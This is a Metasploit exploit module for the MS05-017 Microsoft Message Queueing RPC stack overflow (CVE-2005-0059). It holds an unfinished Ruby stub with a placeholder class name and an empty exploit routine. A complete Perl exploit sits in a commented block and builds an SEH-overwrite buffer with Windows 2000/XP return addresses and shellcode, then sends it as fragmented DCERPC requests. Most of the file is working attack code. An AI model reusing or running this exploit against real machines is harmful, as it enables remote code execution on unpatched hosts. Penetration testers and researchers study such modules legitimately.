require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Microsoft Message Queueing Service MSO5-017',
			'Description'    => %q{
				This module exploits a stack overflow in the RPC interface
				to the Microsoft Message Queueing service. The offset to the
				return address changes based on the length of the system
				hostname, so this must be provided via the 'HNAME' option.
				Much thanks to snort.org and Jean-Baptiste Marchand's
				excellent MSRPC website.
					
			},
			'Author'         => [ 'hdm' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'OSVDB', '15458'],
					[ 'CVE', '2005-0059'],
					[ 'MSB', 'MS05-017'],
					[ 'MIL', '41'],

				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 1024,
					'BadChars' => "\x00\x0a\x0d\x5c\x5f\x2f\x2e",
					'Prepend'  => "\x81\xc4\xff\xef\xff\xff\x44",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'win32, win2000, winxp',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => 'Apr 12 2005',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::msmq_deleteobject_ms05_017;
use strict;
use base "Msf::Exploit";
use Pex::DCERPC;
use Pex::Text;

my $advanced =
  {
	'FragSize'  => [256, 'The DCERPC fragment size'],
  };

my $info =
  {
	'Name'    => 'Microsoft Message Queueing Service MSO5-017',
	'Version' => '$Revision$',
	'Authors' =>
	  [
		'H D Moore <hdm [at] metasploit.com>',
	  ],
	
	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32', 'win2000', 'winxp' ],
	'Priv'  => 1,

	'AutoOpts'  => { 'EXITFUNC' => 'process' },
	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 2103 ],
		'HNAME' => [1, 'DATA', 'The netbios name of the target'],
	  },

	'Payload' =>
	  {
		'Space'     => 1024,
		'BadChars'  => "\x00\x0a\x0d\x5c\x5f\x2f\x2e",
		'Keys'      => ['+ws2ord'],

		# sub esp, 4097 + inc esp makes stack happy
		'Prepend' => "\x81\xc4\xff\xef\xff\xff\x44",
	  },

	'Description'  => Pex::Text::Freeform(qq{
		This module exploits a stack overflow in the RPC interface to the Microsoft 
	Message Queueing service. The offset to the return address changes based on the
	length of the system hostname, so this must be provided via the 'HNAME' option. 
	Much thanks to snort.org and Jean-Baptiste Marchand's excellent MSRPC website.
}),

	'Refs'  =>
	  [
		[ 'OSVDB', '15458'     ],
		[ 'CVE',   '2005-0059' ],
		[ 'MSB',   'MS05-017'  ],
		[ 'MIL',   '41'        ],
	  ],

	'DefaultTarget' => 0,
	'Targets' =>
	  [
		[ 'Windows 2000 ALL / Windows XP SP0-SP1 (English)', 0x004014e9, 0x01001209 ], # mqsvc.exe
	  ],

	'Keys'  => ['msmq'],

	'DisclosureDate' => 'Apr 12 2005',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_name = $self->GetVar('HNAME');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $fragsize    = $self->GetVar('FragSize') || 256;

	my $target = $self->Targets->[$target_idx];
	my ($res, $rpc);

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
	  );

	if ($s->IsError) {
		$self->PrintLine("[*] Socket error: " . $s->GetError());
		return(0);
	}

	# MSMQ supports three forms of queue names, the two we can use are
	# the IP address and the hostname. If we use the IP address via the
	# TCP: format, the offset to the SEH frame will change depending on
	# the length of the real hostname. For this reason, we force the user
	# to supply us with the actual hostname.

	# Formats: DIRECT=TCP:IPAddress\QueueName DIRECT=OS:ComputerName\QueueName

	my $name = "OS:$target_name";
	my $hlen = length($target_name) * 2;

	my $quepath = Pex::SMB->NTUnicode("$name\\PRIVATE\$\\");
	my $pattern = Pex::Text::EnglishText(4000);

	# Windows 2000 SEH offset goes first
	substr($pattern, 332 + $hlen + 0, 4, pack('V', $target->[1]));
	substr($pattern, 332 + $hlen - 4, 2, "\xeb\x22");

	# Windows XP SEH offset goes second
	substr($pattern, 368 + $hlen + 0, 4, pack('V', $target->[2]));
	substr($pattern, 368 + $hlen - 4, 2, "\xeb\x06");

	# Finally the shellcode on the end
	substr($pattern, 368 + $hlen + 4, length($shellcode), $shellcode);

	if ($self->GetVar('DEBUGME')) {
		$self->PrintLine("[*] Switching to the diagnostics request pattern");
		$pattern = Pex::Text::PatternCreate(4000);
	}

	# Append the path to the location and null terminate it
	$quepath .= $pattern . "\x00\x00";

	# Get the unicode length of this string
	my $pathlen = int(length($quepath) / 2);

	# Stick the RPC stub header on and set the request length
	my $overflow = pack('VVVVVV', 1, 1, 1, 3, 3, 2);
	$overflow .= pack('VVV', $pathlen, 0, $pathlen);
	$overflow .= $quepath;

	# Create our RPC packets for the transaction
	my ($bind, $ctx) = Pex::DCERPC::BindFakeMulti(Pex::DCERPC::UUID('MSMQ'), '1.0');
	my @pkts = Pex::DCERPC::Request(9, $overflow, $fragsize, $ctx);

	# Bind to the MSMQ interface and send the request as fragments
	$self->PrintLine("[*] Attempting to exploit the MSMQ service with ".scalar(@pkts)." frags");
	$s->Send($bind);
	$res = Pex::DCERPC::ReadResponse($s);

	# Loop through and send each RPC fragment
	foreach my $pkt (@pkts) {
		$s->Send($pkt);
	}

	# Try to read the server response
	$res = Pex::DCERPC::ReadResponse($s);

	# Something bad happened, print it out
	if ($res->{'Type'} eq 'fault') {
		$self->PrintLine(sprintf("[*] The target replied with RPC fault status 0x%.8x", $res->{'Status'}));
	}

	if ($res->{'StubData'} eq "\x20\x00\x0e\xc0") {
		$self->PrintLine("[*] Request rejected, possibly due to invalid hostname");
		return;
	}

	if ($res->{'StubData'} eq "\x1e\x00\x0e\xc0" || $res->{'StubData'} eq "\x7a\x00\x07\x80") {
		$self->PrintLine("[*] The target system does not appear to be vulnerable");
		return;
	}

	if (length($res->{'StubData'})) {
		$self->PrintLine("[*] Unknown response received: ".unpack("H*", $res->{'StubData'}));
		return;
	}

	# Wait a couple seconds for the handler to kick in before printing an error
	select(undef, undef, undef, 2);

	$self->PrintLine("[*] No response received, possible Windows XP SP2 target");
	return;
}

1;

=end


end
end	
